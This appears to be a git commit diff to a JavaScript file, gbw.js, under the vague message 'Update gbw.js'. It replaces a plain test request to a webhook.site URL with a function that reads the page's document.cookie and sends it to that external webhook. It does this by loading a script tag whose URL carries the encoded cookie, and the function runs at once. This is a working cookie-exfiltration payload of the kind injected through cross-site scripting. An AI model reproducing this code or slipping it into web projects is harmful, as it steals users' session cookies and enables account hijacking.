81a0defc5ed4dc675a6af9778709d195743f5a9e
Just-Another-Github-Acct <gbwilliams@gmail.com>
2023-12-04 16:44:21 -0500

    Update gbw.js

--- gbw.js
+++ gbw.js
@@ -1,18 +1,8 @@
-// Create a new XMLHttpRequest
-var xhr = new XMLHttpRequest();
-
-// Define the request
-xhr.open("GET", "https://webhook.site/537e3269-9023-44a2-923b-0dedca274076", true);
-
-// Set up a function to handle the response
-xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-        console.log('Request successful');
-        console.log(xhr.responseText);
-    } else if (xhr.readyState === 4) {
-        console.error('There was a problem with the request.');
+    function loadScriptWithCookie() {
+        var cookieValue = document.cookie; // Get the cookie value
+        var script = document.createElement('script');
+        script.src = "https://webhook.site/537e3269-9023-44a2-923b-0dedca274076?a=" + encodeURIComponent(cookieValue);
+        document.head.appendChild(script);
     }
-};
 
-// Send the request
-xhr.send();
+    loadScriptWithCookie(); // Call the function to load the script
